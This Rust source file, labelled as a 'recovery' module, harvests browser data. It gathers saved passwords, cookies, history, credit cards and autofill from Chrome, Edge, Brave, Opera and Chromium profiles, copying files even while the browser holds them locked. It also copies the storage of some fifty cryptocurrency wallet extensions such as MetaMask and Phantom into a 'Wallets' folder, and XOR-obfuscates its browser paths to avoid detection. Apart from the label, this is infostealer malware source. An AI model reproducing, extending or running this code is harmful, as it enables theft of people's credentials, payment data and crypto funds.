use crate::recovery::context::RecoveryContext;
use crate::recovery::fs::copy_dir_limited;
use crate::recovery::helpers::obfuscation::{deobf};
use crate::recovery::task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask};
use async_trait::async_trait;
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::fs;
use tracing::{debug, warn};

#[derive(Clone, Copy, Debug)]
pub enum BrowserDataKind {
    Passwords,
    Bookmarks,
    History,
    Cookies,
    CreditCards,
    Autofill,
}

impl BrowserDataKind {
    pub const fn all() -> [Self; 6] {
        [
            Self::Passwords,
            Self::Bookmarks,
            Self::History,
            Self::Cookies,
            Self::CreditCards,
            Self::Autofill,
        ]
    }

    pub const fn label(&self) -> &'static str {
        match self {
            Self::Passwords => "Passwords",
            Self::Bookmarks => "Bookmarks",
            Self::History => "History",
            Self::Cookies => "Cookies",
            Self::CreditCards => "Credit Cards",
            Self::Autofill => "Autofill",
        }
    }

    pub const fn file_names(&self) -> &'static [&'static str] {
        match self {
            Self::Passwords => &["Login Data"],
            Self::Bookmarks => &["Bookmarks"],
            Self::History => &["History"],
            Self::Cookies => &["Cookies"],
            Self::CreditCards => &["Web Data", "Web Data-journal"],
            Self::Autofill => &["Web Data", "Web Data-journal"],
        }
    }
}

#[derive(Clone, Copy, Debug)]
pub enum BrowserName {
    Chrome,
    Edge,
    Brave,
    Opera,
    Chromium,
}

impl BrowserName {
    pub fn label(&self) -> &'static str {
        match self {
            BrowserName::Chrome => "Google Chrome",
            BrowserName::Edge => "Microsoft Edge",
            BrowserName::Brave => "Brave Browser",
            BrowserName::Opera => "Opera Browser",
            BrowserName::Chromium => "Chromium",
        }
    }

    pub fn process_name(&self) -> &'static str {
        match self {
            BrowserName::Chrome => "chrome.exe",
            BrowserName::Edge => "msedge.exe",
            BrowserName::Brave => "brave.exe",
            BrowserName::Opera => "opera.exe",
            BrowserName::Chromium => "chromium.exe",
        }
    }
}

#[derive(Clone, Debug)]
pub struct BrowserProfile {
    pub browser: BrowserName,
    pub profile_name: String,
    pub path: PathBuf,
}

impl BrowserProfile {
    pub async fn discover_for_root(browser: BrowserName, root: &Path) -> Vec<Self> {
        let mut profiles = Vec::new();

        let mut dir = match fs::read_dir(root).await {
            Ok(dir) => dir,
            Err(err) => {
                debug!(browser=?browser, path=?root, error=?err, "browser root missing");
                return profiles;
            }
        };

        while let Ok(Some(entry)) = dir.next_entry().await {
            if let Ok(metadata) = entry.metadata().await {
                if metadata.is_dir() {
                    let profile_name = entry.file_name().to_string_lossy().into_owned();
                    profiles.push(Self {
                        browser,
                        profile_name,
                        path: entry.path(),
                    });
                }
            }
        }

        let default_profile = root.join("Default");
        if profiles
            .iter()
            .all(|profile| profile.profile_name != "Default")
        {
            if let Ok(metadata) = fs::metadata(&default_profile).await {
                if metadata.is_dir() {
                    profiles.push(Self {
                        browser,
                        profile_name: "Default".into(),
                        path: default_profile,
                    });
                }
            }
        }

        profiles
    }
}

pub struct BrowserRecoveryTask {
    profile: BrowserProfile,
    kind: BrowserDataKind,
}

impl BrowserRecoveryTask {
    pub fn new(profile: BrowserProfile, kind: BrowserDataKind) -> Self {
        Self { profile, kind }
    }
}

#[async_trait]
impl RecoveryTask for BrowserRecoveryTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - {kind}",
            browser = self.profile.browser.label(),
            profile = self.profile.profile_name,
            kind = self.kind.label()
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();

        for file_name in self.kind.file_names().iter() {
            let candidate = self.profile.path.join(file_name);
            match fs::metadata(&candidate).await {
                Ok(metadata) if metadata.is_file() => {
                    let mut final_path = candidate.clone();

                    if matches!(
                        self.kind,
                        BrowserDataKind::Cookies
                            | BrowserDataKind::History
                            | BrowserDataKind::Passwords
                    ) {
                        let temp_dir = ctx
                            .output_dir
                            .join("browsers")
                            .join(self.profile.browser.label());
                        let _ = std::fs::create_dir_all(&temp_dir);
                        let dest = temp_dir.join(format!(
                            "{}_{}_{}",
                            self.profile.profile_name,
                            self.kind.label(),
                            file_name
                        ));

                        if super::lockedfile::copy_locked_file(
                            self.profile.browser.process_name(),
                            &candidate,
                            &dest,
                        ) {
                            final_path = dest;
                        }
                    }

                    if let Ok(new_metadata) = fs::metadata(&final_path).await {
                        artifacts.push(RecoveryArtifact {
                            label: self.kind.label().to_string(),
                            path: final_path,
                            size_bytes: new_metadata.len(),
                            modified: new_metadata.modified().ok(),
                        });
                    }
                }
                Ok(_) => {
                    warn!(path=?candidate, "expected file but found directory");
                }
                Err(err) => {
                    debug!(path=?candidate, error=?err, "missing browser artifact");
                }
            }
        }

        Ok(artifacts)
    }
}

pub struct BrowserExtensionTask {
    profile: BrowserProfile,
}

impl BrowserExtensionTask {
    pub fn new(profile: BrowserProfile) -> Self {
        Self { profile }
    }
}

const TARGET_EXTENSIONS: &[(&str, &str)] = &[
    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
    ("Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad"),
    ("Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec"),
    ("Binance Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp"),
    ("Yoroi", "ffnbelfdoeioaeonhjbnjfmkonbpphgo"),
    ("Sollet", "fhmfbegecebeonpjjmbbpccclghjbhcl"),
    ("OKX Wallet", "mclkkofklkfljcocclepkeepbbeeeocl"),
    ("Authenticator", "bhghoamapcdpobmchallangeid"),
    ("Math Wallet", "afbcbbaebocleolnjfgobidebfbbidnf"),
    ("Exodus Web3", "aholpfdialccbhicgbbehbafndfillid"),
    ("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"),
    ("BitKeep", "jiidiaalihomgebjjocbdghipdbncbda"),
    ("Solflare", "bhhhlbcehkeepbhfofnnjkbeueononhe"),
    ("Rabby Wallet", "acmacmhlonlcgoaoihhmhfbbemndbagc"),
    ("Kaikas", "jblndmgejeenekfeiljndjkbbunba"),
    ("Terra Station", "aiifnbfmplejblepbghpkeccgpobhlpk"),
    ("Keplr", "dmkamcknogkgcdfhhbddcghachpanceb"),
    ("GeroWallet", "bgpipimicnnhedneaaggifneimhlakdq"),
    ("Martian Wallet", "efbglgofoippbgadhlgakkebhffoibda"),
    ("Petra Wallet", "fijngjgcjhjmkafhbhglglpmgdgeclbh"),
    ("Pontem Wallet", "phkbamefinggnoigpghpacnppfbcocll"),
    ("Fewcha Wallet", "ebfidppbeapgggoabnmphhconihbaloo"),
    ("Ethos Wallet", "mcbigmjiafegjgebiogimnoicpddidoh"),
    ("Sui Wallet", "opcgpfmccihajmfhljleebpepfdboncl"),
    ("Nami", "lpchoebaghpjnleebgfbediaeaebdebe"),
    ("Maiar DeFi Wallet", "dkhoceliihnoosnmankmglehlachmcoc"),
    ("Authenticator 2", "ocglpnciphfbiokegecmnoaocnhfdmmp"),
    ("Guarda", "hpglfhgfnhbgpjpfpgjicgln"),
    ("Jaxx Liberty", "cjelfplplepabbackneaniopclgppcll"),
    ("Wombat", "amjlehdcaognenonmdeunonlgdbmmobe"),
    ("MEW CX", "nlbmnnijcnlegmoebonhpfbhbopfdcom"),
    ("Saturn Wallet", "nkddgncdjgjfcddabkaicgepbbndgcon"),
    ("ZilPay", "klnaejjgbibmccnnocpknocnmedeecce"),
    ("Ever Wallet", "npkejubjmaphclfkjcladhpkogmhcobk"),
    ("Braavos", "ohenlellnohplepnedmjalpakoebmjid"),
    ("Argent X", "dlcobpjiigpikoechnabeenhconllbop"),
    ("Slope Wallet", "pocmplpaccclhnjgdigolocialocnnhl"),
    ("Kardiachain", "pdadjkfkgcafgbceimclbndnlnnbiidk"),
    ("Leap Terra", "ndijmbeodpejfibkhbaemojingniedcl"),
    ("SubWallet", "onhogfjephnmsgpfphnngncjgepkckhf"),
    ("Polkadot{.js}", "mopnnhnimadngocjndndjeobkocflbcl"),
    ("Talisman", "fijngjgcjhjmkafhbhglglpmgdgeclbh"),
    ("Enkrypt", "pncajimpkhpcedicglagiedpemhgbedf"),
    ("SafePal", "lgmpdoooghpkibfooqebeunackpkamca"),
    ("Xverse", "idnnbpkonabnnocdbimnboakidmojgiu"),
    ("Leather", "ldojebmookaiafnpeclbiiknphhbhnjd"),
    ("UniSat", "ppbibelpcjmhbdihakhencnbalnplehc"),
    ("OneKey", "jojhbbmbiameaonhbeidepcongalmeta"),
    ("Core", "agoakfeocalloabgjbebhocmclnnoocg"),
    ("Bitski", "mooonnbaicgjjobndhkgebeobhkeimbi"),
    ("Venom", "nanjmgljbomhgeclgabbbiuabj"),
    ("Rise Wallet", "jojhbbmbiameaonhbeidepcongalmeta"),
];

#[async_trait]
impl RecoveryTask for BrowserExtensionTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - Extensions",
            browser = self.profile.browser.label(),
            profile = self.profile.profile_name
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let local_ext_settings = self.profile.path.join("Local Extension Settings");
        let indexed_db = self.profile.path.join("IndexedDB");
        let local_storage = self.profile.path.join("Local Storage").join("leveldb");

        for (name, id) in TARGET_EXTENSIONS {
            let extension_settings_dir = local_ext_settings.join(id);
            if fs::metadata(&extension_settings_dir).await.is_ok() {
                let dest_root = ctx
                    .output_dir
                    .join("services")
                    .join("Wallets")
                    .join(format!(
                        "{}_{}_{}_Settings",
                        self.profile.browser.label(),
                        self.profile.profile_name,
                        name
                    ));
                let _ = fs::create_dir_all(&dest_root).await;
                let _ = copy_dir_limited(
                    &extension_settings_dir,
                    &dest_root,
                    name,
                    &mut artifacts,
                    usize::MAX,
                    0,
                )
                .await;
            }

            if fs::metadata(&indexed_db).await.is_ok() {
                let mut dir = fs::read_dir(&indexed_db).await?;
                while let Some(entry) = dir.next_entry().await? {
                    let fname = entry.file_name().to_string_lossy().to_string();
                    if fname.contains(id) {
                        let dest_root =
                            ctx.output_dir
                                .join("services")
                                .join("Wallets")
                                .join(format!(
                                    "{}_{}_{}_IndexedDB",
                                    self.profile.browser.label(),
                                    self.profile.profile_name,
                                    name
                                ));
                        let _ = fs::create_dir_all(&dest_root).await;
                        let _ = copy_dir_limited(
                            &entry.path(),
                            &dest_root.join(&fname),
                            name,
                            &mut artifacts,
                            usize::MAX,
                            0,
                        )
                        .await;
                    }
                }
            }

            if fs::metadata(&local_storage).await.is_ok() {
                let dest_root = ctx
                    .output_dir
                    .join("services")
                    .join("Wallets")
                    .join(format!(
                        "{}_{}_{}_Storage",
                        self.profile.browser.label(),
                        self.profile.profile_name,
                        name
                    ));

                let mut dir = fs::read_dir(&local_storage).await?;
                while let Some(entry) = dir.next_entry().await? {
                    let fname = entry.file_name().to_string_lossy().to_string();
                    if fname.contains(id) {
                        let _ = fs::create_dir_all(&dest_root).await;
                        let target = dest_root.join(&fname);
                        if let Ok(_) = fs::copy(entry.path(), &target).await {
                            let meta = fs::metadata(&target).await?;
                            artifacts.push(RecoveryArtifact {
                                label: format!("{} Storage", name),
                                path: target,
                                size_bytes: meta.len(),
                                modified: meta.modified().ok(),
                            });
                        }
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

pub async fn default_browser_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();

    for (browser, root) in browser_data_roots(ctx) {
        let profiles = BrowserProfile::discover_for_root(browser, &root).await;
        for profile in profiles {
            for kind in BrowserDataKind::all() {
                let task: Arc<dyn RecoveryTask> =
                    Arc::new(BrowserRecoveryTask::new(profile.clone(), kind));
                tasks.push(task);
            }
            tasks.push(Arc::new(BrowserExtensionTask::new(profile.clone())));
        }
    }

    tasks
}

pub fn browser_data_roots(ctx: &RecoveryContext) -> Vec<(BrowserName, PathBuf)> {
    vec![
        (
            BrowserName::Chrome,
            // "Google/Chrome/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xFA, 0xCE, 0xCE, 0xDA, 0xDB, 0xD8, 0xAF, 0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD8, 0xAF,
                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Edge,
            // "Microsoft/Edge/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xF0, 0xD4, 0xDE, 0xCF, 0xD2, 0xCE, 0xD2, 0xDB, 0xC9, 0xAF, 0xFC, 0xDB, 0xDA, 0xD8,
                0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Brave,
            // "BraveSoftware/Brave-Browser/User Data"
            ctx.local_data_dir.join(deobf(&[
                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE, 0xAF,
                0x9F, 0xCF, 0xDA, 0xC3, 0xD8, 0x90, 0x9F, 0xCF, 0xD2, 0xDA, 0x8E, 0xD8, 0xCF, 0xAF,
                0xA0, 0x8E, 0xCE, 0xDB, 0xE1, 0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
        (
            BrowserName::Opera,
            // "Opera Software/Opera Stable"
            ctx.roaming_data_dir.join(deobf(&[
                0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xD2, 0xDB, 0xDB, 0x8A, 0xDA, 0xCF, 0xCE,
                0xAF, 0xFC, 0x8D, 0xD8, 0xCF, 0xDA, 0xE1, 0xA6, 0xDB, 0xDA, 0x9F, 0xDB, 0xD8,
            ])),
        ),
        (
            BrowserName::Chromium,
            // "Chromium/User Data"
            ctx.local_data_dir.join(deobf(&[
                0xFC, 0xCD, 0xCF, 0xD2, 0xDB, 0xD4, 0xC8, 0xDB, 0xAF, 0xA0, 0x8E, 0xCE, 0xDB, 0xE1,
                0xF1, 0xDA, 0xDB, 0xDA,
            ])),
        ),
    ]
}
